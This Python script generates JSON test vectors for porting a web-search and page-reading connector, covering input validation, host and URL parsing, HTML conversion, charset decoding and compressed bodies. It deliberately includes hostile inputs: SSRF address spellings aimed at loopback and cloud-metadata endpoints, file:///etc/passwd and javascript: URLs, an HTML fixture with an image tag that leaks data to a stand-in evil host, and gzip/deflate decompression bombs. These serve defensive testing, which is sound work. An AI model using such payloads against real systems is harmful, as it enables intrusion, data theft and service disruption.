"""Writes vectors.json: what today's Python computes for the Web connector (backend/connectors/web/), for its
port (src/connectors/web/, src/lib/sites.ts, src/lib/urlsplit.ts, src/lib/markdown.ts):
- the declaration, with search offered or not, and the input schemas;
- the inputs of both tools as the models normalize them, with the query hash, and the search cursors
  `_prepare_search` accepts;
- host names (`canonical_host`), site ids, patterns and choices, and web addresses (`parse_url`, with and
  without a base), on listed hostile spellings and seeded random ones;
- `urllib.parse.urljoin` on seeded random pairs;
- page text (`html_to_text`) with base addresses, `plain` on snippets, and `decode` on bodies;
- bodies through `_body`: gzip and deflate in every wrapper, split at every byte, damaged, cut short, with
  second members and trailing data, and bombs.
The executor's helpers (validation_message, _canonical, _hash) are read from executor.py's source, which
imports Django, rather than restated. Addresses are made up, on reserved example domains where they need
not be real. Nothing is resolved or fetched.

Run from cloudflare/:
  cd ../backend && uv run python -I ../cloudflare/test/fixtures/connectors/web/generate.py

The committed file keeps a sample of the seeded random groups (HOSTS_RANDOM, URLS_RANDOM, JOINS_RANDOM, HTML_RANDOM) to
stay under about 500 KB; add `--full` (after the script's path) for the whole set, about 0.6 MB, for a local run.
"""

import ast
import asyncio
import base64
import gzip
import hashlib
import json
import random
import struct
import sys
import zlib
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from urllib.parse import urljoin

HERE = Path(__file__).resolve().parent
BACKEND = HERE.parents[4] / "backend"
sys.path.insert(0, str(BACKEND))
sys.path.insert(0, str(HERE.parent))

import httpx  # noqa: E402
from pydantic import SecretStr, ValidationError  # noqa: E402

from connectors.base import Binding, Builtin, OperationError  # noqa: E402
from connectors.web import connector as web_connector  # noqa: E402
from connectors.web import fetch, sites  # noqa: E402
from connectors.web.markdown import html_to_text  # noqa: E402
from connectors.web.search import plain  # noqa: E402
from vector_size import compact, sample  # noqa: E402

random.seed(20261012)
HOSTS_RANDOM = sample(600, 100)  # host names of random characters
URLS_RANDOM = sample(700, 120)  # addresses of random pieces
JOINS_RANDOM = sample(1200, 200)  # urljoin pairs of random pieces
HTML_RANDOM = sample(300, 50)  # pages of random tags
CONNECTION = "0199a000-0000-7000-8000-0000000000f1"


def executor_helpers() -> dict[str, Any]:
    """validation_message, _canonical and _hash, compiled from executor.py on their own."""
    tree = ast.parse((BACKEND / "connectors" / "executor.py").read_text())
    wanted = {"validation_message", "_canonical", "_hash"}
    body = [node for node in tree.body if isinstance(node, ast.FunctionDef) and node.name in wanted]
    if {node.name for node in body} != wanted:
        raise SystemExit("executor.py no longer defines the helpers this generator reads.")
    namespace: dict[str, Any] = {"json": json, "hashlib": hashlib, "Any": Any, "ValidationError": ValidationError}
    exec(compile(ast.Module(body=body, type_ignores=[]), "executor.py", "exec"), namespace)  # noqa: S102
    return namespace


HELPERS = executor_helpers()


def with_key(key: str | None):
    """The connector's view of the configuration: only the Brave key, so nothing else is read."""
    secret = SecretStr(key) if key is not None else None
    web_connector.config = lambda: SimpleNamespace(brave_search_api_key=secret)
    return web_connector.WebConnector()


def raised(error: BaseException) -> dict[str, Any]:
    if isinstance(error, OperationError):
        return {"ok": False, "code": error.code, "message": error.message}
    return {"ok": False, "raises": type(error).__name__}


def declaration() -> dict[str, Any]:
    # The key is read when asked, so each answer is taken while its configuration is in place.
    keyed = with_key("k")
    offered_with_key = {op.name: keyed.offered(op) for op in keyed.operations}
    connector = with_key(None)
    assert isinstance(connector.auth, Builtin)
    return {
        "slug": connector.slug,
        "name": connector.name,
        "kinds": [
            {
                "id": k.id,
                "label": k.label,
                "actions": list(k.actions),
                "wildcard": k.wildcard,
                "hierarchical": k.hierarchical,
                "note": k.note,
                "listed": k.listed,
            }
            for k in connector.kinds
        ],
        "actions": [{"id": a.id, "label": a.label, "requires": a.requires} for a in connector.actions],
        "browsable": sorted(connector.browsable),
        "manage_link": connector.manage_link(),
        "operations": [
            {
                "name": op.name,
                "title": op.title,
                "description": op.description,
                "needs": [list(n) for n in op.needs],
                "output_action": op.output_action,
                "consent": None if op.consent is None else [sorted(o) for o in op.consent],
                "revision": op.revision,
                "mutates": op.mutates,
                "paginated": op.paginated,
                "offered": connector.offered(op),
                "offered_with_key": offered_with_key[op.name],
                "input_schema": op.input_model.model_json_schema(),
            }
            for op in connector.operations
        ],
    }


INPUTS: dict[str, list[Any]] = {
    "search": [
        None,
        {},
        {"query": "python docs"},
        {"query": "  python  "},
        {"query": ""},
        {"query": "   "},
        {"query": "a\tb"},
        {"query": "a\nb"},
        {"query": "a\u0085b"},
        {"query": "café \U0001f600"},
        {"query": "x" * 400},
        {"query": "x" * 401},
        {"query": "\U0001f600" * 400},
        {"query": "\U0001f600" * 401},
        {"query": " " + "x" * 400 + " "},
        {"query": 5},
        {"query": None},
        {"query": "q", "limit": 1},
        {"query": "q", "limit": 20},
        {"query": "q", "limit": 0},
        {"query": "q", "limit": 21},
        {"query": "q", "limit": "5"},
        {"query": "q", "limit": True},
        {"query": "q", "limit": None},
        {"query": "q", "country": "CH"},
        {"query": "q", "country": " DE "},
        {"query": "q", "country": "ch"},
        {"query": "q", "country": "CHE"},
        {"query": "q", "country": "C"},
        {"query": "q", "country": "C1"},
        {"query": "q", "country": "İT"},
        {"query": "q", "country": None},
        {"query": "q", "country": ""},
        {"query": "q", "freshness": "day"},
        {"query": "q", "freshness": "year"},
        {"query": "q", "freshness": "hour"},
        {"query": "q", "freshness": "Day"},
        {"query": "q", "freshness": None},
        {"query": "q", "cursor": "1"},
        {"query": "q", "cursor": " 2 "},
        {"query": "q", "cursor": ""},
        {"query": "q", "cursor": "c" * 300},
        {"query": "q", "cursor": "c" * 301},
        {"query": "q", "cursor": None},
        {"query": "q", "connection": "x"},
        {"query": "q", "page": 2},
        [],
        "q",
    ],
    "read_page": [
        None,
        {},
        {"url": "https://example.com/"},
        {"url": "  https://example.com/  "},
        {"url": ""},
        {"url": "   "},
        {"url": "u" * 2000},
        {"url": "u" * 2001},
        {"url": "\U0001f600" * 2000},
        {"url": "https://example.com/", "max_chars": 500},
        {"url": "https://example.com/", "max_chars": 499},
        {"url": "https://example.com/", "max_chars": 100_000},
        {"url": "https://example.com/", "max_chars": 100_001},
        {"url": "https://example.com/", "max_chars": "600"},
        {"url": "https://example.com/", "offset": 0},
        {"url": "https://example.com/", "offset": -1},
        {"url": "https://example.com/", "offset": 10_000_000},
        {"url": "https://example.com/", "offset": 10_000_001},
        {"url": "https://example.com/", "offset": None},
        {"url": "https://example.com/", "extra": 1},
        {"url": 1},
        {"url": None},
    ],
}


def inputs() -> dict[str, list[dict[str, Any]]]:
    out: dict[str, list[dict[str, Any]]] = {}
    for op in with_key("k").operations:
        cases = []
        for raw in INPUTS[op.name]:
            try:
                data = op.input_model.model_validate(raw if raw is not None else {})
            except ValidationError as error:
                cases.append({"raw": raw, "ok": False, "message": HELPERS["validation_message"](error)})
                continue
            fields = data.model_dump()
            query_hash = HELPERS["_hash"](HELPERS["_canonical"]({k: v for k, v in fields.items() if k != "cursor"}))
            cases.append({"raw": raw, "ok": True, "fields": fields, "query_hash": query_hash})
        out[op.name] = cases
    return out


CURSORS = ["", "0", "1", "9", "10", "01", "09", "1" * 40, "٣", "١٠", "²", "1²", "①", "\U0001d7d9", "x", "-1", "+1", " 1", "1.0", "１"]


def cursors() -> list[dict[str, Any]]:
    out = []
    binding = Binding(CONNECTION, None)
    for cursor in CURSORS:
        data = web_connector.Search(query="q", cursor=cursor or None)
        try:
            asyncio.run(web_connector._prepare_search(binding, data))
            out.append({"cursor": cursor, "ok": True})
        except Exception as error:  # noqa: BLE001 (what escapes is the vector)
            out.append({"cursor": cursor, **raised(error)})
    return out


HOSTS = [
    "Docs.Python.ORG.",
    "docs.python.org..",
    "bücher.ch",
    "BÜCHER.CH",
    "xn--bcher-kva.ch",
    "xn--zz.com",
    "faß.de",
    "العربية.example",
    "localhost",
    "localhost.",
    "LOCALHOST",
    "foo.localhost",
    "intranet",
    "printer.local",
    "db.internal",
    "site.example",
    "site.test",
    "site.invalid",
    "1.0.0.10.in-addr.arpa",
    "abc.onion",
    "127.0.0.1",
    "127.0.0.1.",
    "[127.0.0.1]",
    "[::1]",
    "::1",
    "::ffff:127.0.0.1",
    "[::ffff:7f00:1]",
    "fe80::1%en0",
    "127.1",
    "127.0.1",
    "0x7f.1",
    "0x7f000001",
    "0177.0.0.1",
    "017700000001",
    "2130706433",
    "127.000.000.001",
    "0",
    "0.0.0.0",
    "１２７.０.０.１",
    "١٢٧.0.0.1",
    "127。0。0。1",
    "127.0.0.1.nip.io",
    "127-0-0-1.nip.io",
    "7f000001.nip.io",
    "10.0.0.1.sslip.io",
    "169.254.169.254.nip.io",
    "localtest.me",
    "a.localtest.me",
    "metadata.google.internal",
    "169.254.169.254",
    "[fd00:ec2::254]",
    "-bad-.com",
    "bad-.com",
    "a..com",
    "x" * 63 + ".com",
    "x" * 64 + ".com",
    ".".join(["a"] * 99) + ".com",
    "a_b.com",
    "a b.com",
    "",
    " ",
    "com",
    "co.uk",
    "github.io",
    "ada.github.io",
    "kobe.jp",
    "city.kobe.jp",
    "x.city.kobe.jp",
    "example.notatld",
    "example.123",
    "example.0x1",
    "K.com",
    "℀.com",
    "a‍.com",
    "­.com",
    "ex­ample.com",
    "EXAMPLE.COM。",
]


def host_cases() -> list[str]:
    alphabet = ["a", "b", "x", "0", "1", "7", "9", ".", ".", "-", "f", "e", "ü", "１", "。", "[", "]", ":", "%", "_"]
    cases = list(HOSTS)
    for _ in range(HOSTS_RANDOM):
        cases.append("".join(random.choice(alphabet) for _ in range(random.randint(1, 14))) + random.choice(["", ".com", ".co.uk", ".io", ".example", "."]))
    return cases


def hosts() -> list[dict[str, Any]]:
    out = []
    for raw in host_cases():
        case: dict[str, Any] = {"raw": raw}
        for key, reserved in (("plain", False), ("reserved", True)):
            try:
                case[key] = {"ok": True, "host": sites.canonical_host(raw, reserved=reserved)}
            except Exception as error:  # noqa: BLE001
                case[key] = raised(error)
        out.append(case)
    return out


IDS = [
    "python.org",
    "*.python.org",
    "*.docs.python.org",
    "*.a.docs.python.org",
    "*.ada.github.io",
    "ada.github.io",
    "*.org",
    "*.co.uk",
    "*.github.io",
    "*",
    "*.",
    "Python.org",
    "*.*.python.org",
    "**.python.org",
    "localhost",
    "1.2.3.4",
    "10.0.0.1",
    "xn--bcher-kva.ch",
    "bücher.ch",
    "*.xn--bcher-kva.ch",
    "*.kobe.jp",
    "*.city.kobe.jp",
    "shop.example.co.uk",
    "*.example.co.uk",
    "site.example",
    "*.site.example",
    "python.org.",
    " python.org",
    "",
]
ANCESTOR_HOSTS = [
    "a.docs.python.org",
    "python.org",
    "ada.github.io",
    "shop.example.co.uk",
    "docs.python.org",
    "x.y.z.city.kobe.jp",
    "city.kobe.jp",
    "a.b.c.d.e.f.example.com",
    "site.example",
    "a.site.example",
    "xn--bcher-kva.ch",
]


def site_ids() -> dict[str, Any]:
    return {
        "ids": [{"id": i, "valid": sites.valid_id(i), "name": sites.name(i)} for i in IDS],
        "hosts": [{"host": h, "ancestors": list(sites.ancestors(h)), "choices": sites.choices(h), "registrable": sites.registrable(h)} for h in ANCESTOR_HOSTS],
    }


URLS = [
    "HTTPS://Docs.Python.org/3/library/os.html?q=a%20b#frag",
    "http://example.com",
    "https://example.com:443/x",
    "http://example.com:80/x",
    "http://example.com:443/x",
    "https://example.com:0443/x",
    "https://example.com:/x",
    "https://example.com:+443/x",
    "https://example.com:٤٤٣/x",
    "https://example.com:99999/x",
    "https://example.com:8443/",
    "https://example.com:x/",
    "ftp://example.com/",
    "file:///etc/passwd",
    "javascript:alert(1)",
    "data:text/html,hi",
    "https://user:pw@example.com/",
    "https://user@example.com/",
    "https://@example.com/",
    "https://example.com@127.0.0.1/",
    "https://127.0.0.1/",
    "https://127.0.0.1./",
    "https://[::1]/",
    "https://[::ffff:127.0.0.1]/",
    "https://[::ffff:7f00:1]/",
    "https://[0:0:0:0:0:ffff:127.0.0.1]/",
    "https://[::127.0.0.1]/",
    "https://[64:ff9b::7f00:1]/",
    "https://[2002:7f00:1::1]/",
    "https://[fe80::1%25en0]/",
    "https://[fe80::1%en0]/",
    "https://[fd00:ec2::254]/",
    "https://[v1.fe80::1]/",
    "https://[127.0.0.1]/",
    "https://[example.com]/",
    "https://[::1/",
    "https://::1]/",
    "http://127.1/",
    "http://127.0.1/",
    "http://2130706433/",
    "http://017700000001/",
    "http://0x7f000001/",
    "http://0x7f.0.0.1/",
    "http://0177.0.0.1/",
    "http://127.000.000.001/",
    "http://0/",
    "http://0.0.0.0/",
    "http://１２７.０.０.１/",
    "http://127。0。0。1/",
    "http://localhost/",
    "http://localhost./",
    "http://LocalHost:80/",
    "http://foo.localhost/",
    "http://127.0.0.1.nip.io/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://printer.local/",
    "https://example.com\\@evil.org/",
    "https://exa mple.com/",
    "https://example.com/\n",
    "https://example.com/\t",
    "https://example.com/ ",
    "https://example.com/　",
    "https://example.com/\x7f",
    "https://example.com/\x00",
    "https:///path",
    "https:/example.com/",
    "https:example.com/",
    "//example.com/",
    "example.com/",
    "/path",
    "https://example.com",
    "https://example.com?",
    "https://example.com?a=1",
    "https://example.com#f",
    "https://example.com/a b",
    "https://example.com/café?q=ü&x=\U0001f600",
    "https://example.com/%zz%41?%",
    "https://example.com/a'b?c'd",
    "https://example.com/[x]?[y]",
    "https://example.com/a\"b<c>d^e`f{g}h|i",
    "https://example.com/a/../b/./c",
    "https://example.com/;p?q;r",
    "https://bücher.ch/",
    "https://xn--bcher-kva.ch/",
    "https://℀.example.com/",
    "https://example.com℀/",
    "https://ex­ample.com/",
    "https://EXAMPLE.COM./",
    "https://" + "a" * 2000 + ".com/",
    "https://example.com/" + "a" * 1980,
    "https://example.com/" + "a" * 1981,
    "HtTpS://example.com/",
    " https://example.com/",
    "\x01https://example.com/",
]
BASES = ["https://docs.python.org/3/library/os.html?q=a%20b", "http://example.com/", "https://example.com/a/b/c", "https://example.com/a/b/"]
RELATIVE = [
    "/next",
    "next",
    "../up",
    "../../../../x",
    "./x",
    ".",
    "..",
    "?q=1",
    "#frag",
    "",
    "//other.org/y",
    "//127.0.0.1/",
    "//[::1]/",
    "//example.com:8443/",
    "///x",
    "http://example.com/new",
    "https://evil.example.org/x",
    "http://10.0.0.1/",
    "http:path",
    "https:path",
    "ftp://example.com/",
    "/a/../../b",
    "//user@example.com/",
    "//[x]/",
    "javascript:alert(1)",
    "%2e%2e/x",
    "/café",
    "//bücher.ch/",
    "//℀/",
]


def url_case(raw: str, base: str | None) -> dict[str, Any]:
    case: dict[str, Any] = {"raw": raw, "base": base}
    try:
        url = sites.parse_url(raw, base=sites.parse_url(base) if base else None)
        case["result"] = {"ok": True, "scheme": url.scheme, "host": url.host, "target": url.target}
    except Exception as error:  # noqa: BLE001
        case["result"] = raised(error)
    return case


def url_cases() -> list[dict[str, Any]]:
    out = [url_case(raw, None) for raw in URLS]
    out += [url_case(raw, base) for base in BASES for raw in RELATIVE]
    schemes = ["http://", "https://", "HTTP://", "ftp://", "//", "", "https:", "https:///"]
    users = ["", "", "", "u@", "u:p@", "@", "a@b@"]
    hosts_ = ["example.com", "docs.python.org", "127.0.0.1", "[::1]", "[v1.x]", "[x", "bücher.ch", "localhost", "0x7f.1", "a.b.co.uk", "℀", "EXAMPLE.ORG"]
    ports = ["", "", ":443", ":80", ":8080", ":", ":0", ":65536", ":x"]
    paths = ["", "/", "/a b", "/café", "/%41%zz", "/a/../b", "/x?y=1&z=ü", "?q", "#f", "/[a]", "\\x"]
    for _ in range(URLS_RANDOM):
        raw = random.choice(schemes) + random.choice(users) + random.choice(hosts_) + random.choice(ports) + random.choice(paths)
        out.append(url_case(raw, random.choice([None, None, None, random.choice(BASES)])))
    return out


def urljoins() -> list[dict[str, Any]]:
    pieces = ["http:", "https:", "ftp:", "mailto:", "//", "/", "a", "..", ".", "?", "#", "x=1", "example.com", "[::1]", "[", "]", "@", ":", "%", "℀", " ", "\t", "b/", "../"]
    bases = BASES + ["https://example.com", "https://example.com/?q#f", "http://example.com/a/b;p?q#f", ""]
    out = []
    for _ in range(JOINS_RANDOM):
        url = "".join(random.choice(pieces) for _ in range(random.randint(0, 6)))
        base = random.choice(bases)
        try:
            out.append({"base": base, "url": url, "ok": True, "joined": urljoin(base, url)})
        except ValueError:
            out.append({"base": base, "url": url, "ok": False})
    return out


PAGES = [
    """<html><head><title> The  Title </title><style>p{}</style></head><body>
    <nav><a href="/home">Home</a></nav>
    <h1>Heading</h1><p>Some <b>bold</b> and <a href="/docs (1)">a link</a>.</p>
    <script>steal()</script><iframe src="https://evil.example.org"></iframe>
    <ul><li>one</li><li>two<ol><li>inner</li></ol></li></ul>
    <pre>  indented
    code</pre>
    <img src="https://evil.example.org/leak?d=secret" alt="A cat">
    <a href="javascript:alert(1)">bad</a>
    <table><tr><th>A</th><th>B</th></tr><tr><td>1</td><td>2</td></tr></table>
    <footer>Footer</footer></body></html>""",
    '<a href="/">x<script>',
    '<a href="/a">one <a href="/b">two</a></a>',
    '<a href="../up">up</a> <a href="?q=1">q</a> <a href="#f">f</a> <a href="//other.example.org/x">o</a>',
    '<a href=" https://example.com/x ">sp</a><a href="https://example.com/x">https://example.com/x</a>',
    '<a href="//[x]/">bad</a><a href="//[::1]/">v6</a><a href="mailto:a@example.com">m</a>',
    '<a href="' + "/" + "a" * 520 + '">long</a>',
    "<p>café &amp; &lt;tags&gt; &#x1F600;</p><a href='/café x'>c</a>",
]
BASE_URLS = ["https://example.com/page", "https://example.com/", "http://docs.example.org/a/b/c?x=1", ""]


def html_cases() -> list[dict[str, Any]]:
    out = []
    for page in PAGES:
        for base in BASE_URLS:
            text, title = html_to_text(page, base)
            out.append({"html": page, "base": base, "text": text, "title": title})
    tags = ["<a href='{}'>", "</a>", "<p>", "</p>", "<li>", "<ul>", "</ul>", "<b>", "<pre>", "</pre>", "<img alt='{}'>", "<script>", "</script>", "<title>", "</title>", "<br/>", "<h2>", "<td>", "<tr>"]
    hrefs = ["/", "x", "../y", "?q", "#f", "//other.example.org/", "https://a.example.org/(b)", "javascript:x", "http://[::1]/", "//[x", "  /pad  ", "/a b", "é"]
    words = ["word", " ", "\n", "  two  ", "&amp;", "café", "1. x", "- y", "```"]
    for _ in range(HTML_RANDOM):
        parts = []
        for _ in range(random.randint(1, 12)):
            tag = random.choice(tags + words)
            parts.append(tag.format(random.choice(hrefs)) if "{}" in tag else tag)
        page = "".join(parts)
        base = random.choice(BASE_URLS)
        text, title = html_to_text(page, base)
        out.append({"html": page, "base": base, "text": text, "title": title})
    return out


SNIPPETS = [
    "The &amp; official <strong>docs</strong>",
    "<strong>Python</strong> docs",
    "  a\n\tb c　d  ",
    "<b>unclosed",
    "a < b > c",
    "&lt;script&gt;",
    "&#x1F600; &notin; &notit; &amp",
    "",
    "<em>x</em> y",
]


def decodes() -> list[dict[str, Any]]:
    bodies = [
        b"<p>Hello</p>",
        "<meta charset='iso-8859-1'><p>Zürich</p>".encode("latin-1"),
        "<META CHARSET = \"windows-1252\"><p>€</p>".encode("cp1252"),
        "<meta http-equiv='Content-Type' content='text/html; charset=shift_jis'><p>日本</p>".encode("shift_jis"),
        "Zürich".encode("latin-1"),
        "Zürich".encode(),
        b"\xef\xbb\xbfbom",
        "utf16".encode("utf-16"),
        "utf16be".encode("utf-16-be"),
        b"\xfe\xff\x00a",
        b"<!DOCTYPE html><p>x</p>",
        b"  \n<html><p>x</p>",
        b"plain text",
        b"\x00binary",
        b"%PDF-1.4",
        b"\x80\x81\xff invalid utf8",
        b"",
        b"<meta charset=base64>x",
        b"<meta charset=bogus><p>\xe9</p>",
    ]
    types = [
        "text/html; charset=utf-8",
        "text/html",
        "TEXT/HTML ; Charset=\"latin-1\"",
        "text/plain; charset=latin-1",
        "text/plain; charset=utf-16",
        "text/plain; charset = koi8-r",
        "text/plain; charset=bogus",
        "text/plain; charset=hex",
        "text/plain; charset=rot13",
        "application/json",
        "application/ld+json",
        "image/svg+xml",
        "application/pdf",
        "",
        "  ",
        "text/csv;charset=cp1252",
        "text/markdown; charſet=latin-1",
    ]
    out = []
    for body in bodies:
        for content_type in types:
            case: dict[str, Any] = {"body": base64.b64encode(body).decode(), "content_type": content_type}
            try:
                mime, form, text = fetch.decode(body, content_type)
                case["result"] = {"ok": True, "mime": mime, "form": form, "text": text}
            except Exception as error:  # noqa: BLE001
                case["result"] = raised(error)
            out.append(case)
    return out


class _Stream(httpx.AsyncByteStream):
    def __init__(self, chunks: list[bytes]) -> None:
        self.chunks = chunks

    async def __aiter__(self):
        for chunk in self.chunks:
            yield chunk


def body_case(encoding: str | None, chunks: list[bytes]) -> dict[str, Any]:
    headers = {"content-encoding": encoding} if encoding is not None else {}
    response = httpx.Response(200, headers=headers, stream=_Stream(chunks))
    case: dict[str, Any] = {"encoding": encoding, "chunks": [base64.b64encode(c).decode() for c in chunks]}
    try:
        body = asyncio.run(fetch._body(response))
        case["result"] = {"ok": True, "length": len(body), "sha256": hashlib.sha256(body).hexdigest(), "head": base64.b64encode(body[:64]).decode()}
    except Exception as error:  # noqa: BLE001
        case["result"] = raised(error)
    return case


def gzip_member(data: bytes, *, name: bytes | None = None, comment: bytes | None = None, extra: bytes | None = None, hcrc: bool = False, flags: int = 0) -> bytes:
    flg = flags | (0x04 if extra is not None else 0) | (0x08 if name is not None else 0) | (0x10 if comment is not None else 0) | (0x02 if hcrc else 0)
    header = b"\x1f\x8b\x08" + bytes([flg]) + b"\x00\x00\x00\x00\x00\xff"
    if extra is not None:
        header += struct.pack("<H", len(extra)) + extra
    if name is not None:
        header += name + b"\x00"
    if comment is not None:
        header += comment + b"\x00"
    if hcrc:
        header += struct.pack("<H", zlib.crc32(header) & 0xFFFF)
    raw = zlib.compressobj(9, zlib.DEFLATED, -15)
    packed = raw.compress(data) + raw.flush()
    return header + packed + struct.pack("<II", zlib.crc32(data), len(data) & 0xFFFFFFFF)


def splits(data: bytes) -> list[list[bytes]]:
    return [[data[:i], data[i:]] for i in range(len(data) + 1)]


def bodies() -> list[dict[str, Any]]:
    page = b"<p>" + b"hello world " * 20 + b"</p>"
    member = gzip_member(page, name=b"page.html", comment=b"c", extra=b"xy", hcrc=True)
    zlibbed = zlib.compress(page)
    raw = zlib.compress(page)[2:-4]
    out = []
    for chunks in splits(member):
        out.append(body_case("gzip", chunks))
    for chunks in splits(zlibbed)[:12] + splits(zlibbed)[-8:]:
        out.append(body_case("deflate", chunks))
    for chunks in splits(raw)[:6] + splits(raw)[-6:]:
        out.append(body_case("deflate", chunks))
    plain_gzip = gzip.compress(page)
    bad_crc = plain_gzip[:-8] + struct.pack("<I", zlib.crc32(page) ^ 1) + plain_gzip[-4:]
    bad_size = plain_gzip[:-4] + struct.pack("<I", len(page) + 1)
    bad_hcrc = bytearray(member)
    hcrc_at = 10 + 2 + 2 + len(b"page.html") + 1 + len(b"c") + 1
    bad_hcrc[hcrc_at] ^= 1
    bad_adler = zlibbed[:-1] + bytes([zlibbed[-1] ^ 1])
    fdict = bytes([0x78, 0xBB]) + raw
    others = [
        ("gzip", [plain_gzip]),
        ("x-gzip", [plain_gzip]),
        ("GZIP", [plain_gzip]),
        (" gzip ", [plain_gzip]),
        ("gzip, identity", [plain_gzip]),
        ("identity, gzip", [plain_gzip]),
        ("identity", [page]),
        ("", [page]),
        (None, [page]),
        ("gzip, gzip", [plain_gzip]),
        ("gzip, br", [plain_gzip]),
        ("br", [page]),
        ("compress", [page]),
        ("zstd", [page]),
        ("gzip", [bad_crc]),
        ("gzip", [bad_size]),
        ("gzip", [bytes(bad_hcrc)]),
        ("gzip", [plain_gzip[:-3]]),
        ("gzip", [plain_gzip[: len(plain_gzip) // 2]]),
        ("gzip", [plain_gzip[:5]]),
        ("gzip", [plain_gzip + gzip.compress(b"SECOND")]),
        ("gzip", [plain_gzip + b"trailing garbage"]),
        ("gzip", [plain_gzip, b"trailing", b"garbage"]),
        ("gzip", [b"\x1f\x8b\x08\xe0" + plain_gzip[4:]]),
        ("gzip", [b"\x1f\x8c" + plain_gzip[2:]]),
        ("gzip", [b"\x1f\x8b\x07" + plain_gzip[3:]]),
        ("gzip", [zlibbed]),
        ("gzip", [page]),
        ("gzip", [b""]),
        ("gzip", []),
        ("deflate", [bad_adler]),
        ("deflate", [zlibbed + b"trailing"]),
        ("deflate", [raw + b"trailing"]),
        ("deflate", [fdict]),
        ("deflate", [page]),
        ("deflate", [plain_gzip]),
        ("deflate", [zlibbed[:-2]]),
        ("deflate", [b"\x78"]),
        ("deflate", [b"\x78", zlibbed[1:]]),
        ("gzip", [gzip.compress(gzip.compress(page))]),
    ]
    for encoding, chunks in others:
        out.append(body_case(encoding, chunks))
    # Bombs: far more than the cap from little input, in one chunk and in many.
    for size in (fetch.MAX_BODY, fetch.MAX_BODY + 1, fetch.MAX_BODY + 10, 40 * fetch.MAX_BODY):
        bomb = gzip.compress(b"a" * size, 9)
        out.append(body_case("gzip", [bomb]))
        out.append(body_case("gzip", [bomb[i : i + 997] for i in range(0, len(bomb), 997)]))
        deflated = zlib.compress(b"\x00" * size, 9)
        out.append(body_case("deflate", [deflated]))
        out.append(body_case("deflate", [deflated[2:-4]]))
    return out


def main() -> None:
    vectors = {
        "declaration": declaration(),
        "inputs": inputs(),
        "cursors": cursors(),
        "hosts": hosts(),
        "sites": site_ids(),
        "urls": url_cases(),
        "urljoin": urljoins(),
        "html": html_cases(),
        "plain": [{"text": t, "plain": plain(t)} for t in SNIPPETS],
        "decode": decodes(),
        "bodies": bodies(),
    }
    target = HERE / "vectors.json"
    target.write_text(json.dumps(compact(vectors), ensure_ascii=True, separators=(",", ":")) + "\n")
    print(f"Wrote {target.relative_to(HERE.parents[3])} ({target.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
